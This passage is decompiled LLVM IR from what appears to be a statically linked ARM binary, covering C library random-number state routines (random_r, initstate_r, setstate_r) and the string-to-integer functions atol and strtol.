  %v2_c74c = icmp eq i32 %v0_c74c, 0
  %v1_c750 = add i32 %tmp, 8
  %v2_c750 = inttoptr i32 %v1_c750 to i32*
  %v3_c750 = load i32, i32* %v2_c750, align 4
  store i32 %v3_c750, i32* %r6.global-to-local, align 4
  br i1 %v2_c74c, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_c74c
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_c74c, %bb
  %v0_c75c = phi i32 [ %v0_c74c, %dec_label_pc_c74c ], [ 1, %bb ]
  %v2_c758 = icmp eq i8 %v3_c740, 0
  %v2_c75c = inttoptr i32 %v3_c750 to i32*
  store i32 %v0_c75c, i32* %v2_c75c, align 4
  br i1 %v2_c758, label %dec_label_pc_c7e8, label %dec_label_pc_c764

dec_label_pc_c764:                                ; preds = %bb23
  %v1_c764 = add i32 %tmp, 13
  %v2_c764 = inttoptr i32 %v1_c764 to i8*
  %v3_c764 = load i8, i8* %v2_c764, align 1
  %v4_c764 = sext i8 %v3_c764 to i32
  store i32 %v4_c764, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_c770 = load i32, i32* @r0, align 4
  store i32 %v0_c770, i32* %r4.global-to-local, align 4
  %v0_c774 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_c774, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_c7b425 = icmp sgt i8 %v3_c764, 1
  br i1 %v5_c7b425, label %dec_label_pc_c780, label %dec_label_pc_c7b8

dec_label_pc_c780:                                ; preds = %dec_label_pc_c764, %dec_label_pc_c780.dec_label_pc_c780_crit_edge
  %v1_c794 = phi i32 [ %v1_c794.pre, %dec_label_pc_c780.dec_label_pc_c780_crit_edge ], [ 2836, %dec_label_pc_c764 ]
  %v1_c788 = phi i32 [ %v1_c788.pre, %dec_label_pc_c780.dec_label_pc_c780_crit_edge ], [ 16807, %dec_label_pc_c764 ]
  %v0_c78427 = phi i32 [ %v0_c7a8.pre, %dec_label_pc_c780.dec_label_pc_c780_crit_edge ], [ %v0_c770, %dec_label_pc_c764 ]
  %v1_c7a026 = phi i32 [ %v5_c7a0, %dec_label_pc_c780.dec_label_pc_c780_crit_edge ], [ %v0_c774, %dec_label_pc_c764 ]
  %v3_c780 = urem i32 %v0_c78427, 127773
  %v2_c788 = mul i32 %v1_c788, %v3_c780
  %v2_c790 = sdiv i32 %v0_c78427, 127773
  %v2_c794 = mul i32 %v1_c794, %v2_c790
  %v2_c798 = sub i32 %v2_c788, %v2_c794
  %v8_c798 = icmp slt i32 %v2_c798, 0
  %v2_c79c = add i32 %v2_c798, 2147483647
  %v2_c79c.v2_c798 = select i1 %v8_c798, i32 %v2_c79c, i32 %v2_c798
  store i32 %v2_c79c.v2_c798, i32* %r4.global-to-local, align 4
  %v2_c7a0 = add i32 %v1_c7a026, 4
  %v3_c7a0 = inttoptr i32 %v2_c7a0 to i32*
  store i32 %v2_c79c.v2_c798, i32* %v3_c7a0, align 4
  %v4_c7a0 = load i32, i32* %r8.global-to-local, align 4
  %v5_c7a0 = add i32 %v4_c7a0, 4
  store i32 %v5_c7a0, i32* %r8.global-to-local, align 4
  %v0_c7a4.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_c7a4.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_c7a8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_c7b0 = add i32 %v0_c7a4.pre, 1
  store i32 %v1_c7b0, i32* %r7.global-to-local, align 4
  %v5_c7b4 = icmp slt i32 %v0_c7a4.pre, %v1_c7a4.pre
  br i1 %v5_c7b4, label %dec_label_pc_c780.dec_label_pc_c780_crit_edge, label %dec_label_pc_c7a4.dec_label_pc_c7b8_crit_edge

dec_label_pc_c780.dec_label_pc_c780_crit_edge:    ; preds = %dec_label_pc_c780
  %v1_c788.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_c794.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_c780

dec_label_pc_c7a4.dec_label_pc_c7b8_crit_edge:    ; preds = %dec_label_pc_c780
  %v0_c7c8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c7b8

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c7a4.dec_label_pc_c7b8_crit_edge, %dec_label_pc_c764
  %v0_c7c8 = phi i32 [ %v0_c7c8.pre, %dec_label_pc_c7a4.dec_label_pc_c7b8_crit_edge ], [ %v0_c774, %dec_label_pc_c764 ]
  %v0_c7bc.lcssa = phi i32 [ %v1_c7a4.pre, %dec_label_pc_c7a4.dec_label_pc_c7b8_crit_edge ], [ %v4_c764, %dec_label_pc_c764 ]
  %v2_c7bc = mul i32 %v0_c7bc.lcssa, 10
  store i32 %v2_c7bc, i32* @r4, align 4
  %v0_c7c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_c7c0 = add i32 %v0_c7c0, 14
  %v2_c7c0 = inttoptr i32 %v1_c7c0 to i8*
  %v3_c7c0 = load i8, i8* %v2_c7c0, align 1
  %v4_c7c0 = sext i8 %v3_c7c0 to i32
  %v2_c7c4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_c7c4, i32* %r7.global-to-local, align 4
  %v4_c7c8 = mul nsw i32 %v4_c7c0, 4
  %v5_c7c8 = add i32 %v0_c7c8, %v4_c7c8
  %v1_c7cc = inttoptr i32 %v0_c7c0 to i32*
  store i32 %v5_c7c8, i32* %v1_c7cc, align 4
  %v3_c7cc = add i32 %v0_c7c0, 4
  %v4_c7cc = inttoptr i32 %v3_c7cc to i32*
  %v5_c7cc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_c7cc, i32* %v4_c7cc, align 4
  br label %dec_label_pc_c7d8

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c7d8
  %v0_c7dc = load i32, i32* %r5.global-to-local, align 4
  %v2_c7d4 = inttoptr i32 %v0_c7dc to i32*
  %v3_c7d4 = call i32 @__GI_random_r(i32* %v2_c7d4, i32 %v2_c7c4)
  br label %dec_label_pc_c7d8

dec_label_pc_c7d8:                                ; preds = %dec_label_pc_c7b8, %dec_label_pc_c7d4
  %v0_c7d8 = load i32, i32* @r4, align 4
  %v1_c7d8 = add i32 %v0_c7d8, -1
  store i32 %v1_c7d8, i32* @r4, align 4
  %v6_c7d8 = icmp slt i32 %v1_c7d8, 0
  br i1 %v6_c7d8, label %dec_label_pc_c7e8, label %dec_label_pc_c7d4

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c7d8, %bb23
  %v2_c7f0.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_c7ec

dec_label_pc_c7ec:                                ; preds = %.dec_label_pc_c7ec_crit_edge, %dec_label_pc_c7e8
  %v2_c7f0 = phi i32 [ %v3_c72c, %.dec_label_pc_c7ec_crit_edge ], [ %v2_c7f0.pre, %dec_label_pc_c7e8 ]
  %v1_c7f4 = phi i32 [ -1, %.dec_label_pc_c7ec_crit_edge ], [ 0, %dec_label_pc_c7e8 ]
  store i32 %v2_c7f0, i32* @r4, align 4
  ret i32 %v1_c7f4

; uselistorder directives
  uselistorder i32 %v1_c7d8, { 1, 0 }
  uselistorder i32 %v0_c7c0, { 1, 0, 2 }
  uselistorder i32 %v0_c7a4.pre, { 1, 0 }
  uselistorder i32 %v5_c7a0, { 1, 0 }
  uselistorder i32 %v0_c78427, { 1, 0 }
  uselistorder i32 %v0_c774, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_c7ec, { 1, 0 }
  uselistorder label %dec_label_pc_c7d8, { 1, 0 }
  uselistorder label %dec_label_pc_c780, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c7f8:
  %v0_c7f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c7f8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c7f8
  %v2_c7f8 = load i32, i32* @r7, align 4
  %v5_c7f8 = udiv i32 %v2_c7f8, 8
  %v6_c7f8 = and i32 %v5_c7f8, %arg1
  %v3_c7fc = load i32, i32* @fp, align 4
  %v8_c7fc = shl i32 %v6_c7f8, %v3_c7fc
  %v9_c7fc = and i32 %v8_c7fc, %arg1
  %v2_c800 = load i32, i32* @sp, align 4
  %v8_c800 = shl i32 %v2_c800, %arg3
  %v9_c800 = and i32 %v8_c800, %arg2
  call void @__pseudo_branch(i32 %v9_c800)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c7f8, %bb
  %v10_c800 = phi i32 [ %arg1, %dec_label_pc_c7f8 ], [ %v9_c7fc, %bb ]
  ret i32 %v10_c800

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_c804 = load i32, i32* @r4, align 4
  %v6_c804 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_c834, label %dec_label_pc_c824

dec_label_pc_c824:                                ; preds = %entry
  %v2_c824 = icmp ugt i32 %arg2, 254
  %v7_c824 = icmp eq i32 %arg2, 255
  %v2_c828 = xor i1 %v7_c824, true
  %v3_c828 = and i1 %v2_c824, %v2_c828
  br i1 %v3_c828, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_c824
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_c824, %bb
  %v1_c8607 = phi i32 [ %v3_c804, %dec_label_pc_c824 ], [ 4, %bb ]
  %v2_c82c = xor i1 %v2_c824, true
  %v3_c82c = or i1 %v7_c824, %v2_c82c
  br i1 %v3_c82c, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_c834:                                ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_c84c, label %dec_label_pc_c83c

dec_label_pc_c83c:                                ; preds = %dec_label_pc_c834
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_c8bc

.thread10:                                        ; preds = %dec_label_pc_c83c
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_c84c:                                ; preds = %dec_label_pc_c834
  %v2_c84c = icmp ugt i32 %arg2, 62
  %v7_c84c = icmp eq i32 %arg2, 63
  %v2_c850 = xor i1 %v7_c84c, true
  %v3_c850 = and i1 %v2_c84c, %v2_c850
  br i1 %v3_c850, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_c84c
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_c84c, %bb23
  %v1_c8606 = phi i32 [ %v3_c804, %dec_label_pc_c84c ], [ 2, %bb23 ]
  %v2_c854 = xor i1 %v2_c84c, true
  %v3_c854 = or i1 %v7_c84c, %v2_c854
  br i1 %v3_c854, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_c86c = phi i32 [ 3, %bb22 ], [ %v1_c8607, %bb21 ], [ %v1_c8606, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37436), i32* %r3.global-to-local, align 4
  %v4_c860 = mul i32 %v1_c86c, 4
  %v5_c860 = add i32 %v4_c860, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37436)
  store i32 %v5_c860, i32* %r2.global-to-local, align 4
  %v1_c864 = add i32 %v4_c860, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37416)
  %v2_c864 = inttoptr i32 %v1_c864 to i32*
  %v3_c864 = load i32, i32* %v2_c864, align 4
  store i32 %v3_c864, i32* %r1.global-to-local, align 4
  %v1_c868 = add i32 %tmp, 4
  store i32 %v1_c868, i32* @r6, align 4
  %v6_c86c = inttoptr i32 %v5_c860 to i32*
  %v7_c86c = load i32, i32* %v6_c86c, align 4
  store i32 %v7_c86c, i32* %r2.global-to-local, align 4
  %v4_c870 = mul i32 %v3_c864, 4
  %v5_c870 = add i32 %v4_c870, %v1_c868
  store i32 %v5_c870, i32* %r3.global-to-local, align 4
  %v2_c874 = add i32 %arg3, 16
  %v3_c874 = inttoptr i32 %v2_c874 to i32*
  store i32 %v5_c870, i32* %v3_c874, align 4
  %v0_c878 = load i32, i32* %r2.global-to-local, align 4
  %v1_c878 = trunc i32 %v0_c878 to i8
  %v2_c878 = load i32, i32* @r5, align 4
  %v3_c878 = add i32 %v2_c878, 14
  %v4_c878 = inttoptr i32 %v3_c878 to i8*
  store i8 %v1_c878, i8* %v4_c878, align 1
  %v0_c87c = load i32, i32* %r1.global-to-local, align 4
  %v1_c87c = trunc i32 %v0_c87c to i8
  %v2_c87c = load i32, i32* @r5, align 4
  %v3_c87c = add i32 %v2_c87c, 13
  %v4_c87c = inttoptr i32 %v3_c87c to i8*
  store i8 %v1_c87c, i8* %v4_c87c, align 1
  %v0_c880 = load i32, i32* @r4, align 4
  %v1_c880 = trunc i32 %v0_c880 to i8
  %v2_c880 = load i32, i32* @r5, align 4
  %v3_c880 = add i32 %v2_c880, 12
  %v4_c880 = inttoptr i32 %v3_c880 to i8*
  store i8 %v1_c880, i8* %v4_c880, align 1
  %v0_c884 = load i32, i32* @r6, align 4
  %v1_c884 = load i32, i32* @r5, align 4
  %v2_c884 = add i32 %v1_c884, 8
  %v3_c884 = inttoptr i32 %v2_c884 to i32*
  store i32 %v0_c884, i32* %v3_c884, align 4
  %v0_c888 = load i32, i32* @r5, align 4
  store i32 %v0_c888, i32* %r1.global-to-local, align 4
  %v0_c88c = load i32, i32* @r0, align 4
  %v2_c88c = inttoptr i32 %v0_c88c to i32*
  %v3_c88c = call i32 @srandom_r(i32* %v2_c88c, i32 %v0_c888)
  store i32 %v3_c88c, i32* %r0.global-to-local, align 4
  %v0_c890 = load i32, i32* @r4, align 4
  %v2_c890 = icmp eq i32 %v0_c890, 0
  br i1 %v2_c890, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_c8ac12 = load i32, i32* @r7, align 4
  %v2_c8ac13 = inttoptr i32 %v1_c8ac12 to i32*
  store i32 0, i32* %v2_c8ac13, align 4
  %v1_c8b0 = load i32, i32* @r4, align 4
  store i32 %v1_c8b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c8e0

.thread4:                                         ; preds = %bb26
  %v1_c894 = load i32, i32* @r5, align 4
  %v2_c894 = add i32 %v1_c894, 4
  %v3_c894 = inttoptr i32 %v2_c894 to i32*
  %v4_c894 = load i32, i32* %v3_c894, align 4
  %v1_c898 = load i32, i32* @r6, align 4
  %v3_c898 = sub i32 %v4_c894, %v1_c898
  %v4_c89c = sdiv i32 %v3_c898, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_c8a4 = mul i32 %v4_c89c, 5
  %v5_c8a4 = add i32 %v4_c8a4, %v0_c890
  store i32 %v5_c8a4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_c8ac = load i32, i32* @r7, align 4
  %v2_c8ac = inttoptr i32 %v1_c8ac to i32*
  store i32 0, i32* %v2_c8ac, align 4
  %v1_c8b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_c8b4 = load i32, i32* @r7, align 4
  %v3_c8b4 = inttoptr i32 %v2_c8b4 to i32*
  store i32 %v1_c8b4, i32* %v3_c8b4, align 4
  %v1_c8e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c8e0

dec_label_pc_c8bc:                                ; preds = %dec_label_pc_c83c
  store i32 88612, i32* %r3.global-to-local, align 4
  %v0_c8c0 = call i32 @__aeabi_read_tp()
  %v3_c8c4 = load i16, i16* @global_var_222f0.75, align 2
  %v4_c8c4 = sext i16 %v3_c8c4 to i32
  store i32 22, i32* %r2.global-to-local, align 4
  %v3_c8cc = add i32 %v4_c8c4, %v0_c8c0
  %v4_c8cc = inttoptr i32 %v3_c8cc to i32*
  store i32 22, i32* %v4_c8cc, align 4
  store i32 %v4_c8c4, i32* %r3.global-to-local, align 4
  %v0_c8d8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_c8d8, i32* %v4_c8cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c8e0

dec_label_pc_c8e0:                                ; preds = %bb27, %.thread4, %dec_label_pc_c8bc
  %v1_c8e8 = phi i32 [ %v1_c8e8.pre, %.thread4 ], [ %v1_c8b0, %bb27 ], [ -1, %dec_label_pc_c8bc ]
  store i32 %v3_c804, i32* @r4, align 4
  store i32 %v6_c804, i32* @r5, align 4
  ret i32 %v1_c8e8

; uselistorder directives
  uselistorder i32 %v4_c8c4, { 1, 0 }
  uselistorder i1 %v7_c84c, { 1, 0 }
  uselistorder i1 %v7_c824, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_c8e0, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_c8fc = load i32, i32* @r4, align 4
  store i32 %v3_c8fc, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_c904 = add i32 %tmp, 12
  %v2_c904 = inttoptr i32 %v1_c904 to i8*
  %v3_c904 = load i8, i8* %v2_c904, align 1
  %v4_c904 = zext i8 %v3_c904 to i32
  store i32 %v4_c904, i32* %r1.global-to-local, align 4
  %v2_c908 = icmp eq i8 %v3_c904, 0
  store i1 %v2_c908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c908, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_c91012 = add i32 %arg1, 4
  store i32 %v1_c91012, i32* %r6.global-to-local, align 4
  %v1_c91413 = add i32 %tmp, 8
  %v2_c91414 = inttoptr i32 %v1_c91413 to i32*
  %v3_c91415 = load i32, i32* %v2_c91414, align 4
  store i32 %v3_c91415, i32* %r0.global-to-local, align 4
  %v3_c930 = add i32 %v3_c91415, -4
  %v4_c930 = inttoptr i32 %v3_c930 to i32*
  store i32 %v4_c904, i32* %v4_c930, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_c90c = add i32 %tmp, 4
  %v3_c90c = inttoptr i32 %v2_c90c to i32*
  %v4_c90c = load i32, i32* %v3_c90c, align 4
  %v1_c910 = add i32 %arg1, 4
  store i32 %v1_c910, i32* %r6.global-to-local, align 4
  %v1_c914 = add i32 %tmp, 8
  %v2_c914 = inttoptr i32 %v1_c914 to i32*
  %v3_c914 = load i32, i32* %v2_c914, align 4
  store i32 %v3_c914, i32* %r0.global-to-local, align 4
  %v3_c91c = sub i32 %v4_c90c, %v3_c914
  %v4_c920 = sdiv i32 %v3_c91c, 4
  %v4_c924 = sext i8 %v3_c904 to i32
  store i32 %v4_c924, i32* %r1.global-to-local, align 4
  %v4_c92c = mul i32 %v4_c920, 5
  %v5_c92c = add i32 %v4_c92c, %v4_c924
  %v3_c934 = add i32 %v3_c914, -4
  %v4_c934 = inttoptr i32 %v3_c934 to i32*
  store i32 %v5_c92c, i32* %v4_c934, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_c938 = load i32, i32* %r6.global-to-local, align 4
  %v1_c938 = add i32 %v0_c938, -4
  %v2_c938 = inttoptr i32 %v1_c938 to i32*
  %v3_c938 = load i32, i32* %v2_c938, align 4
  store i32 %v3_c938, i32* %r8.global-to-local, align 4
  %v2_c944 = udiv i32 %v3_c938, 5
  %v3_c944 = urem i32 %v3_c938, 5
  store i32 %v2_c944, i32* %r0.global-to-local, align 4
  store i32 %v3_c944, i32* %r1.global-to-local, align 4
  %v2_c94c = icmp ugt i32 %v3_c944, 3
  %v7_c94c = icmp eq i32 %v3_c944, 4
  store i1 %v7_c94c, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r5.global-to-local, align 4
  %v2_c954 = xor i1 %v7_c94c, true
  %v3_c954 = and i1 %v2_c94c, %v2_c954
  br i1 %v3_c954, label %dec_label_pc_c9bc, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %bb
  %v4_c960 = mul nuw nsw i32 %v3_c944, 4
  %v5_c960 = add i32 %v4_c960, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37436)
  %v1_c964 = add i32 %v4_c960, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37416)
  %v2_c964 = inttoptr i32 %v1_c964 to i32*
  %v3_c964 = load i32, i32* %v2_c964, align 4
  store i32 %v3_c964, i32* %r5.global-to-local, align 4
  %v6_c968 = inttoptr i32 %v5_c960 to i32*
  %v7_c968 = load i32, i32* %v6_c968, align 4
  store i32 %v7_c968, i32* %r7.global-to-local, align 4
  %v2_c96c = icmp eq i32 %v3_c944, 0
  store i1 %v2_c96c, i1* %cpsr_z.global-to-local, align 1
  %v1_c970 = trunc i32 %v3_c964 to i8
  %v2_c970 = load i32, i32* %r4.global-to-local, align 4
  %v3_c970 = add i32 %v2_c970, 13
  %v4_c970 = inttoptr i32 %v3_c970 to i8*
  store i8 %v1_c970, i8* %v4_c970, align 1
  %v0_c974 = load i32, i32* %r7.global-to-local, align 4
  %v1_c974 = trunc i32 %v0_c974 to i8
  %v2_c974 = load i32, i32* %r4.global-to-local, align 4
  %v3_c974 = add i32 %v2_c974, 14
  %v4_c974 = inttoptr i32 %v3_c974 to i8*
  store i8 %v1_c974, i8* %v4_c974, align 1
  %v0_c978 = load i32, i32* %r1.global-to-local, align 4
  %v1_c978 = trunc i32 %v0_c978 to i8
  %v2_c978 = load i32, i32* %r4.global-to-local, align 4
  %v3_c978 = add i32 %v2_c978, 12
  %v4_c978 = inttoptr i32 %v3_c978 to i8*
  store i8 %v1_c978, i8* %v4_c978, align 1
  %v0_c97c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c97c, label %dec_label_pc_c9a8, label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c958
  %v0_c984 = load i32, i32* %r8.global-to-local, align 4
  %v2_c988 = sdiv i32 %v0_c984, 5
  store i32 %v2_c988, i32* %r0.global-to-local, align 4
  %v0_c98c = load i32, i32* %r6.global-to-local, align 4
  %v4_c98c = mul i32 %v2_c988, 4
  %v5_c98c = add i32 %v4_c98c, %v0_c98c
  %v1_c990 = load i32, i32* %r4.global-to-local, align 4
  %v2_c990 = add i32 %v1_c990, 4
  %v3_c990 = inttoptr i32 %v2_c990 to i32*
  store i32 %v5_c98c, i32* %v3_c990, align 4
  %v0_c994 = load i32, i32* %r7.global-to-local, align 4
  %v1_c994 = load i32, i32* %r0.global-to-local, align 4
  %v2_c994 = add i32 %v1_c994, %v0_c994
  %v0_c998 = load i32, i32* %r5.global-to-local, align 4
  %v2_c99c = udiv i32 %v2_c994, %v0_c998
  %v3_c99c = urem i32 %v2_c994, %v0_c998
  store i32 %v2_c99c, i32* %r0.global-to-local, align 4
  %v0_c9a0 = load i32, i32* %r6.global-to-local, align 4
  %v4_c9a0 = mul i32 %v3_c99c, 4
  %v5_c9a0 = add i32 %v0_c9a0, %v4_c9a0
  store i32 %v5_c9a0, i32* %r1.global-to-local, align 4
  %v1_c9a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c9a4 = inttoptr i32 %v1_c9a4 to i32*
  store i32 %v5_c9a0, i32* %v2_c9a4, align 4
  br label %dec_label_pc_c9a8

dec_label_pc_c9a8:                                ; preds = %dec_label_pc_c958, %dec_label_pc_c980
  %v0_c9a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_c9a8 = load i32, i32* %r5.global-to-local, align 4
  %v4_c9a8 = mul i32 %v1_c9a8, 4
  %v5_c9a8 = add i32 %v4_c9a8, %v0_c9a8
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_c9b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c9b0 = add i32 %v1_c9b0, 16
  %v3_c9b0 = inttoptr i32 %v2_c9b0 to i32*
  store i32 %v5_c9a8, i32* %v3_c9b0, align 4
  %v0_c9b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_c9b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c9b4 = add i32 %v1_c9b4, 8
  %v3_c9b4 = inttoptr i32 %v2_c9b4 to i32*
  store i32 %v0_c9b4, i32* %v3_c9b4, align 4
  %v1_c9d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9d4

dec_label_pc_c9bc:                                ; preds = %bb
  %v0_c9c0 = call i32 @__aeabi_read_tp()
  %v3_c9c4 = load i16, i16* @global_var_222f0.75, align 2
  %v4_c9c4 = sext i16 %v3_c9c4 to i32
  %v3_c9cc = add i32 %v4_c9c4, %v0_c9c0
  %v4_c9cc = inttoptr i32 %v3_c9cc to i32*
  store i32 22, i32* %v4_c9cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9d4

dec_label_pc_c9d4:                                ; preds = %dec_label_pc_c9a8, %dec_label_pc_c9bc
  %v1_c9d8 = phi i32 [ %v1_c9d8.pre, %dec_label_pc_c9a8 ], [ -1, %dec_label_pc_c9bc ]
  %v2_c9d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_c9d4, i32* @r4, align 4
  ret i32 %v1_c9d8

; uselistorder directives
  uselistorder i32 %v0_c998, { 1, 0 }
  uselistorder i32 %v2_c994, { 1, 0 }
  uselistorder i32 %v3_c938, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37436), { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c9d4, { 1, 0 }
  uselistorder label %dec_label_pc_c9a8, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_c9f8 = call i32 @strtol()
  ret i32 %v0_c9f8
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_ca14 = call i32 @_stdlib_strto_l()
  ret i32 %v0_ca14
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  %v0_ca38 = load i32, i32* @r1, align 4
  store i32 %v0_ca38, i32* %sb.global-to-local, align 4
  %v0_ca3c = load i32, i32* @r2, align 4
  store i32 %v0_ca3c, i32* %r5.global-to-local, align 4
  %v0_ca40 = load i32, i32* @r0, align 4
  store i32 %v0_ca40, i32* %r4.global-to-local, align 4
  %v0_ca44 = load i32, i32* @r3, align 4
